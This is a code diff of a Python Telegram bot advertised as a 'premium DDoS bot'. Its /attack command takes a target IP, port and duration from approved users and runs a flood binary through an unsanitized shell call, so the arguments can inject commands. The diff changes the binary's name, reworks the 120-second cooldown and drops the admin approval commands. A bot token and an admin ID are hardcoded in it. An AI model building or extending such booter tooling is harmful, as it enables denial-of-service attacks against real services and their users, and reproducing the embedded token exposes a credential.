@@ -1,18 +1,16 @@
 import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
-import time
 import os
+from datetime import datetime, timedelta
 
 # Configuration
-TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = ("7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4")  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
 CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
 attack_in_progress = False
-
-# A dictionary to store user cooldowns (120 seconds)
-user_attack_cooldowns = {}
+last_attack_time = {}
 
 # Check if the token is set
 if not TELEGRAM_BOT_TOKEN:
@@ -51,19 +49,16 @@ async def is_member_of_channel(user_id: int, context: CallbackContext):
 async def start(update: Update, context: CallbackContext):
     """Send a welcome message to the user."""
     chat_id = update.effective_chat.id
-    # Welcome image first
-    welcome_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your welcome image URL
-    await context.bot.send_photo(chat_id=chat_id, photo=welcome_image_url)
-
-    # Welcome message after the image
-    welcome_message = (
+    message = (
         "*WELCOME TO GODxCHEATS DDOS*\n\n"
         "*PREMIUM DDOS BOT*\n"
         "*Owner*: @GODxAloneBOY\n"
         f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
         "Use /help to see available commands."
     )
-    await context.bot.send_message(chat_id=chat_id, text=welcome_message, parse_mode='Markdown')
+    image_url = "https://your_image_link_here.com"  # Replace with your actual image URL
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+    await context.bot.send_photo(chat_id=chat_id, photo=image_url)
 
 async def help_command(update: Update, context: CallbackContext):
     """Send a list of available commands and their usage."""
@@ -79,85 +74,13 @@ async def help_command(update: Update, context: CallbackContext):
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def approve(update: Update, context: CallbackContext):
-    """Approve a user or group ID to use the bot."""
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
-        return
-
-    # Extract the target ID
-    target_id = args[0].strip()
-
-    # Validate that the target ID is a number
-    if not target_id.lstrip('-').isdigit():
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
-        return
-
-    # Add the target ID to the approved list
-    approved_ids.add(target_id)
-    save_approved_ids()
-
-    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')
-
-async def remove(update: Update, context: CallbackContext):
-    """Remove a user or group ID from the approved list."""
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if len(args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
-        return
-
-    target_id = args[0].strip()
-    if target_id in approved_ids:
-        approved_ids.remove(target_id)
-        save_approved_ids()
-        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
-    else:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')
-
-async def alluser(update: Update, context: CallbackContext):
-    """List all approved users and groups."""
-    chat_id = update.effective_chat.id
-
-    if not await is_admin(chat_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
-        return
-
-    if not approved_ids:
-        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
-        return
-
-    user_list = "\n".join(approved_ids)
-    await context.bot.send_message(chat_id=chat_id, text=f"*Approved Users and Groups:*\n\n{user_list}", parse_mode='Markdown')
-
 async def attack(update: Update, context: CallbackContext):
-    """Launch an attack if the user is approved and a channel member, with 120-second cooldown."""
+    """Launch an attack if the user is approved and a channel member."""
     global attack_in_progress
 
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     args = context.args
-
-    # Check attack cooldown (120 seconds)
-    last_attack_time = user_attack_cooldowns.get(user_id, 0)
-    current_time = time.time()
-
-    if current_time - last_attack_time < 120:
-        remaining_time = 120 - (current_time - last_attack_time)
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Please wait {int(remaining_time)} seconds before launching another attack.*", parse_mode='Markdown')
-        return
 
     if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
@@ -165,6 +88,13 @@ async def attack(update: Update, context: CallbackContext):
 
     if not await is_member_of_channel(user_id, context):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
+        return
+
+    # 120-second limit check
+    current_time = datetime.now()
+    last_attack = last_attack_time.get(user_id)
+    if last_attack and (current_time - last_attack).seconds < 120:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You can only launch an attack once every 120 seconds.*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
@@ -176,24 +106,19 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     ip, port, time = args
-    
-    # Send attack image first
-    attack_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your attack image URL
+    attack_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with actual image URL
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*✅ Attack Launched ✅*\n"
+        f"*🎯 Target:* {ip}\n"
+        f"*🔌 Port:* {port}\n"
+        f"*⏱ Time:* {time} seconds\n"
+    ), parse_mode='Markdown')
     await context.bot.send_photo(chat_id=chat_id, photo=attack_image_url)
 
-    # Send attack details after the image
-    await context.bot.send_message(chat_id=chat_id, text=(
-        f"*💥 **𝒜𝒯𝒯𝒜𝒞𝒦 𝒮𝒯𝒜𝑅𝒯𝐸𝒟!** 💥 *\n"
-        f"*🎯 **𝒯𝒜𝑅𝒢𝑒𝒯:** `{ip} : {port}` \n"
-        f"*⏳ **𝑫𝑼𝑹𝑨𝑻𝑰𝑶𝑵:** `{time}𝙨`  \n"
-        f"*🎉 **𝒷𝐼𝑅𝒯𝐻𝒟𝒜𝒴 𝐵𝒪𝒴 𝒮𝒫𝐸𝒞𝒾𝒶𝓁 @RajOwner90** 🎉\n"
-    ), parse_mode='Markdown')
+    # Update last attack time
+    last_attack_time[user_id] = current_time
 
-    # Proceed with the attack process
     asyncio.create_task(run_attack(chat_id, ip, port, time, context))
-
-    # Update the cooldown for the user
-    user_attack_cooldowns[user_id] = current_time
 
 async def run_attack(chat_id, ip, port, time, context):
     """Simulate an attack process."""
@@ -202,7 +127,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 500",
+            f"./pushparaj {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -218,10 +143,9 @@ async def run_attack(chat_id, ip, port, time, context):
 
     finally:
         attack_in_progress = False
-        # Attack finished image
-        attack_finished_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your attack finish image URL
-        await context.bot.send_photo(chat_id=chat_id, photo=attack_finished_image_url)
+        attack_finish_image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with actual image URL
         await context.bot.send_message(chat_id=chat_id, text="*♥️ Attack Finished ♥️*", parse_mode='Markdown')
+        await context.bot.send_photo(chat_id=chat_id, photo=attack_finish_image_url)
 
 # Main Function
 def main():
